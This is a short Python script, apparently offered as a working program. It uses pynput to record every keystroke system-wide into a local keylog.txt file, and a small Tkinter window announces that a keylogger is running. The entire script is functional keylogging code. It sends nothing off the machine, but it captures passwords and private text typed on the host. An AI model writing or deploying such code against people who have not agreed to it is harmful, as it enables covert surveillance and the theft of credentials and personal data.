from pynput import keyboard
import tkinter as tk
import threading

# File to save keystrokes
log_file = "keylog.txt"

# Function to log key presses
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Run the keylogger in a separate thread
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Basic Tkinter GUI
def start_gui():
    root = tk.Tk()
    root.title("Keylogger")
    root.geometry("300x150")

    label = tk.Label(root, text="Keylogger is running...\nKeystrokes are being recorded.", font=("Arial", 10), wraplength=280)
    label.pack(pady=30)

    root.mainloop()

# Start the keylogger thread
keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
keylogger_thread.start()

# Start the GUI
start_gui()